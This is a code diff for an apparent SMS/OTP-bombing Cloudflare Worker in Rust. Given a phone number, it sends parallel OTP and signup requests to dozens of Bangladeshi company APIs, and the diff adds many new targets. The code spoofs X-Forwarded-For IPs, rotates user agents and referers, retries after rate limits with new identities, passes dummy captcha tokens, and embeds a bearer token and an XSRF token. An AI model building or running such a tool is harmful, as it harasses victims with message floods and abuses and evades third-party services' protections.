@@ -11,12 +11,12 @@ use js_sys::Function;
 const BLOCKED_NUMBERS: &[&str] = &[
     "01890183516",
     "01893336440",
-    "01516511889", 
+    "01516511889",
     "01905040150",
 ];
 
 // ══════════════════════════════════════════════════════
-//  🔄 USER-AGENT POOL — প্রতিটা request এ rotate
+//  🔄 USER-AGENT POOL
 // ══════════════════════════════════════════════════════
 const USER_AGENTS: &[&str] = &[
     "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
@@ -29,6 +29,7 @@ const USER_AGENTS: &[&str] = &[
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
     "okhttp/4.12.0",
     "okhttp/4.11.0",
@@ -42,9 +43,6 @@ const USER_AGENTS: &[&str] = &[
     "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 10 Build/RKQ1.200826.002)",
 ];
 
-// ══════════════════════════════════════════════════════
-//  🔄 ACCEPT-LANGUAGE POOL
-// ══════════════════════════════════════════════════════
 const ACCEPT_LANGS: &[&str] = &[
     "en-US,en;q=0.9",
     "en-GB,en;q=0.9",
@@ -54,10 +52,6 @@ const ACCEPT_LANGS: &[&str] = &[
     "en-IN,en-GB;q=0.9,en;q=0.8",
 ];
 
-// ══════════════════════════════════════════════════════
-//  🔄 X-FORWARDED-FOR — fake IP pool (এশিয়া রিজিয়ন)
-//  এটা API কে মনে করাবে request বিভিন্ন IP থেকে আসছে
-// ══════════════════════════════════════════════════════
 const FAKE_IPS: &[&str] = &[
     "103.48.196.14",  "202.134.8.11",   "118.179.211.54",
     "103.231.184.32", "43.245.8.192",   "116.193.180.7",
@@ -67,21 +61,15 @@ const FAKE_IPS: &[&str] = &[
     "103.56.207.12",  "103.4.93.188",   "45.115.104.30",
 ];
 
-// ══════════════════════════════════════════════════════
-//  🔄 REFERER POOL — realistic BD referers
-// ══════════════════════════════════════════════════════
 const REFERERS: &[&str] = &[
     "https://www.google.com/",
     "https://www.google.com.bd/",
     "https://www.facebook.com/",
     "https://m.facebook.com/",
-    "",  // কখনো কখনো referer না দিলেও natural দেখায়
+    "",
     "",
 ];
 
-// ══════════════════════════════════════════════════════
-//  🎲 PSEUDO-RANDOM (no rand crate needed)
-// ══════════════════════════════════════════════════════
 fn pseudo_rand(seed: u64) -> u64 {
     let mut x = seed ^ 0x9e3779b97f4a7c15u64;
     x = (x ^ (x >> 30)).wrapping_mul(0xbf58476d1ce4e5b9u64);
@@ -93,11 +81,6 @@ fn pick(arr: &[&'static str], seed: u64) -> &'static str {
     arr[(pseudo_rand(seed) as usize) % arr.len()]
 }
 
-// ══════════════════════════════════════════════════════
-//  ⏱ WORKER-SAFE SLEEP
-//  Cloudflare Workers এ web_sys::window() নেই
-//  js_sys::global() দিয়ে setTimeout পাওয়া যায়
-// ══════════════════════════════════════════════════════
 fn sleep_promise(ms: i32) -> js_sys::Promise {
     js_sys::Promise::new(&mut |resolve, _| {
         let global = js_sys::global();
@@ -109,9 +92,6 @@ fn sleep_promise(ms: i32) -> js_sys::Promise {
     })
 }
 
-// ══════════════════════════════════════════════════════
-//  CORS
-// ══════════════════════════════════════════════════════
 pub fn cors_headers() -> Headers {
     let mut h = Headers::new();
     h.set("Access-Control-Allow-Origin",  "*").unwrap();
@@ -121,10 +101,6 @@ pub fn cors_headers() -> Headers {
     h
 }
 
-// ══════════════════════════════════════════════════════
-//  FIRE ONCE — single attempt
-//  seed → প্রতিটা attempt এ আলাদা, তাই headers rotate হয়
-// ══════════════════════════════════════════════════════
 async fn fire_once(
     name:    &'static str,
     url:     &'static str,
@@ -137,7 +113,6 @@ async fn fire_once(
 
     let mut h = Headers::new();
 
-    // ── API specific headers — এগুলো সবসময় priority পাবে ──
     let mut has_ua           = false;
     let mut has_content_type = false;
     let mut has_accept       = false;
@@ -159,15 +134,12 @@ async fn fire_once(
         let _ = h.set(k, v);
     }
 
-    // ── Missing headers গুলো random value দিয়ে fill ──
     if !has_ua           { let _ = h.set("User-Agent",       pick(USER_AGENTS, seed)); }
     if !has_content_type { let _ = h.set("Content-Type",     "application/json"); }
     if !has_accept       { let _ = h.set("Accept",           "application/json, text/plain, */*"); }
     if !has_lang         { let _ = h.set("Accept-Language",  pick(ACCEPT_LANGS, seed.wrapping_add(2))); }
     if !has_xff          { let _ = h.set("X-Forwarded-For",  pick(FAKE_IPS,     seed.wrapping_add(3))); }
 
-    // Referer — শুধু তখনই add করো যখন API specific referer নেই
-    // এবং 50% chance এ add করো (natural behaviour)
     if !has_referer {
         let rf = pick(REFERERS, seed.wrapping_add(4));
         if !rf.is_empty() {
@@ -175,14 +147,12 @@ async fn fire_once(
         }
     }
 
-    // Extra realistic headers
     let _ = h.set("Cache-Control", "no-cache");
     let _ = h.set("Pragma",        "no-cache");
 
     init.with_headers(h);
     init.with_body(Some(payload.to_string().into()));
 
-    // ── 8 second timeout ──
     let timeout_wrapped = {
         let name = name;
         wasm_bindgen_futures::future_to_promise(async move {
@@ -221,29 +191,12 @@ async fn fire_once(
     }
 }
 
-// ══════════════════════════════════════════════════════
-//  FIRE — smart retry
-//
-//  Dead API detection:
-//  Cloudflare Workers এ global state নেই (stateless)
-//  তাই KV store ছাড়া persistent dead cache সম্ভব না।
-//  কিন্তু একটা request এর ভেতরে dead API কে
-//  2nd attempt skip করা যায় smartly।
-//
-//  Retry logic:
-//  ✓ 2xx       → return immediately
-//  4xx         → no retry (payload/auth ভুল)
-//  429         → wait 800ms → retry different UA/IP
-//  0/timeout   → retry once (network glitch)
-//  5xx         → retry once
-// ══════════════════════════════════════════════════════
 async fn fire(
     name:    &'static str,
     url:     &'static str,
     payload: Value,
     headers: &[(&'static str, &'static str)],
 ) -> Value {
-    // seed — API name থেকে বানাই, deterministic কিন্তু unique per API
     let base_seed: u64 = name.bytes()
         .enumerate()
         .fold(0x517cc1b727220a95u64, |acc, (i, b)| {
@@ -251,7 +204,6 @@ async fn fire(
         });
 
     for attempt in 0..2u8 {
-        // প্রতিটা attempt এ আলাদা seed → আলাদা UA + IP
         let seed = pseudo_rand(base_seed
             .wrapping_add(attempt as u64)
             .wrapping_mul(0x6c62272e07bb0142u64)
@@ -261,23 +213,17 @@ async fn fire(
         let ok     = r["ok"].as_bool().unwrap_or(false);
         let status = r["status"].as_u64().unwrap_or(0);
 
-        // সফল — সঙ্গে সঙ্গে return
         if ok { return r; }
 
-        // এই status এ retry বেকার — dead API
-        // 400=payload ভুল, 401=auth, 403=blocked permanently,
-        // 404=url মরা, 405=method ভুল, 410=gone, 422=format ভুল
         if matches!(status, 400 | 401 | 403 | 404 | 405 | 410 | 422 | 451) {
             return r;
         }
 
-        // 429 rate limit — একটু wait করে আলাদা UA দিয়ে retry
         if status == 429 && attempt == 0 {
             let _ = JsFuture::from(sleep_promise(800)).await;
             continue;
         }
 
-        // 0 (timeout/network) বা 5xx — একবার retry
         if attempt == 0 { continue; }
 
         return r;
@@ -286,10 +232,6 @@ async fn fire(
     json!({"api": name, "status": 0, "ok": false, "err": "all attempts failed"})
 }
 
-// ══════════════════════════════════════════════════════
-//  PARALLEL MACRO — সব API একসাথে fire করে
-//  Promise.all → সবচেয়ে fast approach
-// ══════════════════════════════════════════════════════
 macro_rules! parallel {
     ($($f:expr),+ $(,)?) => {{
         let js_promises = js_sys::Array::new();
@@ -313,9 +255,6 @@ macro_rules! parallel {
     }};
 }
 
-// ══════════════════════════════════════════════════════
-//  MAIN HANDLER
-// ══════════════════════════════════════════════════════
 pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
     let headers = cors_headers();
 
@@ -340,7 +279,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         )?.with_headers(headers));
     }
 
-    // ── Block check ──
     let is_blocked = BLOCKED_NUMBERS.iter().any(|&b| {
         let n  = number_str.trim_start_matches('0');
         let bn = b.trim_start_matches('0');
@@ -359,27 +297,15 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         }).to_string())?.with_headers(headers));
     }
 
-    // ── Number helpers ──
     let number:  &'static str = Box::leak(number_str.clone().into_boxed_str());
     let bd_no:   &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
     let bd_full: &'static str = Box::leak(format!("880{bd_no}").into_boxed_str());
     let plus_bd: &'static str = Box::leak(format!("+88{number_str}").into_boxed_str());
+    let bd_msisdn: &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
 
-    // ══════════════════════════════════════════════════
-    //  🔥 API LIST
-    //
-    //  number  → 01XXXXXXXXX
-    //  bd_no   → 1XXXXXXXXX
-    //  bd_full → 8801XXXXXXXX
-    //  plus_bd → +8801XXXXXXXX
-    //
-    //  User-Agent দিলে → সেটাই use হবে
-    //  না দিলে → automatic random UA rotate হবে
-    //  X-Forwarded-For → automatic random BD IP
-    //  Accept-Language → automatic rotate
-    // ══════════════════════════════════════════════════
     let api_results = parallel![
 
+        // ── পুরনো সব API (unchanged) ──
         fire("Shadhin Music",
             "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
             json!({"msisdn": bd_full, "shortcode": 16235, "servicename": "Shadhin Music"}),
@@ -397,13 +323,17 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         ),
         fire("Walton Plaza",
             "https://waltonplaza.com.bd/api/auth/otp/create",
-            json!({"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": bd_no}, "captchaToken": "recapcha"}),
+            json!({"auth": {"countryCode": "880", "deviceUuid": "5f545c10-e594-11f0-8299-fdfde03856d4", "phone": bd_no, "type": "LOGIN"}, "captchaToken": "no recapcha"}),
             &[("Content-Type","application/json")]
         ),
         fire("Apex4u",
             "https://api.apex4u.com/api/auth/login",
             json!({"phoneNumber": number}),
-            &[("Content-Type","application/json")]
+            &[
+                ("Content-Type","application/json"),
+                ("Referer","https://apex4u.com/"),
+                ("Origin","https://apex4u.com"),
+            ]
         ),
         fire("Nexo Pat",
             "https://host03pet.nexopet.com/api/v1.0/users/send-otp",
@@ -453,7 +383,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("Origin","https://www.deeptoplay.com"),
             ]
         ),
-        fire("RedX",
+        fire("RedX OTP",
             "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
             json!({"phoneNumber": number}),
             &[("Content-Type","application/json"),("Referer","https://redx.com.bd/")]
@@ -472,7 +402,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("Build-Version","(450) 4.5.0"),
             ]
         ),
-        fire("Shikho 2",
+        fire("Shikho SMS",
             "https://api.shikho.com/auth/v2/send/sms",
             json!({"phone": bd_full, "type": "student", "auth_type": "signup", "vendor": "shikho"}),
             &[
@@ -493,12 +423,13 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         ),
         fire("Easy BD",
             "https://core.easy.com.bd/api/v1/registration",
-            json!({"password": "445566", "password_confirmation": "445566", "name": "Team Dangerous", "mobile": number, "referrer_key": "", "email": "dangerousboytushar@gmail.com"}),
+            json!({"password": "445566", "password_confirmation": "445566", "name": "Team Dangerous", "mobile": number, "referrer_key": "", "email": "dangerousboytushar@gmail.com", "device_key": "45098c95a7fe4109cc5969a770ee846a", "social_login_id": ""}),
             &[
                 ("Content-Type","application/json"),
                 ("Host","core.easy.com.bd"),
                 ("lang","en"),
-                ("device-key","48b1f7061f48c950090220f62128b2c3"),
+                ("device-key","45098c95a7fe4109cc5969a770ee846a"),
+                ("Origin","https://easy.com.bd"),
             ]
         ),
         fire("MyGuardian BD",
@@ -509,7 +440,10 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         fire("Gorilla Move",
             "https://api.gorillamove.com/api/v1/core/account/phone_login",
             json!({"phone_number": number, "step": 1}),
-            &[("Content-Type","application/json")]
+            &[
+                ("Content-Type","application/json"),
+                ("Origin","https://www.gorillamove.com"),
+            ]
         ),
         fire("Munchies BD",
             "https://api.munchies.com.bd/parse/functions/generateOtp",
@@ -572,9 +506,14 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
             json!({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "131", "requestChannel": "MOB", "trackingStatus": 5}),
             &[("Content-Type","application/json"),("User-Agent","okhttp/4.10.0")]
         ),
-        fire("Fundesh",
+        fire("Fundesh OTP",
             "https://fundesh.com.bd/api/auth/generateOTP",
-            json!({"msisdn": bd_no}),
+            json!({"msisdn": bd_msisdn}),
+            &[("Content-Type","application/json"),("Origin","https://fundesh.com.bd")]
+        ),
+        fire("Fundesh Resend",
+            "https://fundesh.com.bd/api/auth/resendOTP",
+            json!({"msisdn": number}),
             &[("Content-Type","application/json"),("Origin","https://fundesh.com.bd")]
         ),
         fire("Ghoori Learning",
@@ -611,7 +550,7 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         ),
         fire("PBS BD",
             "https://pbs.com.bd/login/?handler=UserGetOtp",
-            json!({"UserName": "Teamdanderous", "UserPassword": "Tushar", "MobileNo": number}),
+            json!({"UserName": "Teamdangerous", "UserPassword": "Tushar", "MobileNo": number}),
             &[
                 ("Content-Type","application/json"),
                 ("XSRF-Token","CfDJ8C8FhGbSUB1CplCwhmaw48FrjIGNq5sPRk0G6VzBicZtPJrEXDCoqGMiBTb3Fetxypt-480avEXqJS_WJVdEWQeDCz0mKIQO4odODIqIopHM8qh50R7CF3bOGHOtF22Pt-pgeyMhHQTk2t2inqJMRyw"),
@@ -648,8 +587,12 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         ),
         fire("Sundarban Courier",
             "https://api-gateway.sundarbancourierltd.com/graphql",
-            json!({"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }"}),
-            &[("Content-Type","application/json"),("Origin","https://customer.sundarbancourierltd.com")]
+            json!({"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}),
+            &[
+                ("Content-Type","application/json"),
+                ("Origin","https://customer.sundarbancourierltd.com"),
+                ("User-Agent","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"),
+            ]
         ),
         fire("Easy BD Reg",
             "https://core.easy.com.bd/api/v1/registration",
@@ -760,6 +703,195 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
             "https://meenabazardev.com/api/mobile/front/send/otp",
             json!({"CellPhone": number, "type": "login"}),
             &[("Content-Type","application/x-www-form-urlencoded")]
+        ),
+
+        // ══════════════════════════════════════════════
+        //  🆕 নতুন API গুলো
+        // ══════════════════════════════════════════════
+
+        // PBS Alpha (new endpoint)
+        fire("PBS Alpha OTP",
+            "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
+            json!({"userPhone": number, "otp": ""}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://pbs.com.bd"),
+                ("Referer","https://pbs.com.bd/"),
+                ("x-requested-with","XMLHttpRequest"),
+            ]
+        ),
+
+        // Sindabad
+        fire("Sindabad",
+            "https://m2ce.sindabad.com/rest/V1/EasyLogin/isMobileAvailable",
+            json!({"websiteId": 1.0, "customerMobile": number}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://www.sindabad.com"),
+                ("x-requested-with","XMLHttpRequest"),
+            ]
+        ),
+
+        // Garibook v4
+        fire("Garibook",
+            "https://api.garibookadmin.com/api/v4/user/login",
+            json!({"recaptcha_token": "garibookcaptcha", "mobile": plus_bd, "channel": "web"}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://garibook.com"),
+                ("Referer","https://garibook.com/"),
+                ("Accept","application/json"),
+                ("X-Requested-With","mark.via.gp"),
+            ]
+        ),
+
+        // Pickaboo
+        fire("Pickaboo",
+            "https://www.pickaboo.com/rest/default/V1/customer-check/exist",
+            json!({"mobile": number}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://www.pickaboo.com"),
+                ("Referer","https://www.pickaboo.com/"),
+                ("x-requested-with","mark.via.gp"),
+            ]
+        ),
+
+        // Bioscope Live
+        fire("Bioscope Live",
+            "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
+            json!({"number": plus_bd}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://www.bioscopeplus.com"),
+                ("Referer","https://www.bioscopeplus.com/"),
+                ("Accept","application/json"),
+                ("authorization",""),
+            ]
+        ),
+
+        // Le Reve Craze
+        fire("Le Reve Craze",
+            "https://www.lerevecraze.com/login/verify_phone",
+            json!({"mobile_no": number, "resend": "0", "recaptcha_token": "bypass"}),
+            &[
+                ("Content-Type","application/x-www-form-urlencoded"),
+                ("Origin","https://www.lerevecraze.com"),
+                ("Referer","https://www.lerevecraze.com/login/"),
+                ("Accept","application/json, text/javascript, */*; q=0.01"),
+                ("x-requested-with","XMLHttpRequest"),
+            ]
+        ),
+
+        // Khaas Food
+        fire("Khaas Food",
+            "https://www.khaasfood.com/api/auth/request-otp",
+            json!({"username": number}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://www.khaasfood.com"),
+                ("Referer","https://www.khaasfood.com/"),
+                ("Accept","application/json"),
+                ("x-requested-with","mark.via.gp"),
+            ]
+        ),
+
+        // Beauty Booth (new endpoint)
+        fire("Beauty Booth",
+            "https://admin.beautybooth.com.bd/api/v2/auth/register-new",
+            json!({"signature": 280, "type": "phone", "value": number, "token": 39}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://beautybooth.com.bd"),
+                ("Referer","https://beautybooth.com.bd/"),
+                ("x-requested-with","mark.via.gp"),
+            ]
+        ),
+
+        // Chaldal
+        fire("Chaldal",
+            "https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey",
+            json!({"phoneNumber": plus_bd, "retryAttempt": 0}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://chaldal.com"),
+                ("Referer","https://chaldal.com/"),
+                ("Accept","application/json"),
+                ("x-egg-storeid","1"),
+                ("x-egg-clientapp","Omelette"),
+                ("x-egg-platform","Browser"),
+                ("x-requested-with","mark.via.gp"),
+            ]
+        ),
+
+        // Shomvob (applicant endpoint)
+        fire("Shomvob",
+            "https://backend-api.shomvob.co/api/v2/otp/applicant/web/phone/",
+            json!({"phone": bd_full, "is_retry": 0}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Authorization","Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q"),
+                ("Origin","https://app.shomvob.co"),
+                ("Referer","https://app.shomvob.co/auth/"),
+            ]
+        ),
+
+        // RedX login code (different endpoint)
+        fire("RedX Login",
+            "https://api.redx.com.bd/v1/user/request-login-code",
+            json!({"callingCode": "+880", "phoneNumber": bd_no, "countryCode": "BD", "service": "redx"}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://redx.com.bd"),
+                ("Referer","https://redx.com.bd/"),
+            ]
+        ),
+
+        // Shwapno
+        fire("Shwapno",
+            "https://www.shwapno.com/api/auth",
+            json!({"phoneNumber": number}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://www.shwapno.com"),
+                ("x-requested-with","XMLHttpRequest"),
+            ]
+        ),
+
+        // BD Tickets
+        fire("BD Tickets",
+            "https://api.bdtickets.com:20100/v1/auth",
+            json!({"phoneNumber": plus_bd, "createUserCheck": true, "applicationChannel": "WEB_APP"}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://bdtickets.com"),
+                ("Referer","https://bdtickets.com/"),
+            ]
+        ),
+
+        // Rokomari OTP
+        fire("Rokomari",
+            "https://www.rokomari.com/otp/send",
+            json!({}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://www.rokomari.com"),
+                ("Referer","https://www.rokomari.com/login"),
+                ("x-requested-with","XMLHttpRequest"),
+            ]
+        ),
+
+        // Kirei BD
+        fire("Kirei BD",
+            "https://frontendapi.kireibd.com/api/v2/send-login-otp",
+            json!({"email": number}),
+            &[
+                ("Content-Type","application/json; charset=utf-8"),
+                ("Origin","https://kireibd.com"),
+                ("Referer","https://kireibd.com/"),
+                ("Accept","application/json, text/plain, */*"),
+                ("x-requested-with","XMLHttpRequest"),
+            ]
         )
 
         // ══════════════════════════════════════════════
@@ -770,9 +902,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         //      json!({"phone": number}),
         //      &[("Content-Type","application/json")]
         //  ),
-        //
-        //  User-Agent না দিলে automatic random UA rotate হবে
-        //  X-Forwarded-For automatic random BD IP দেবে
         // ══════════════════════════════════════════════
 
     ];
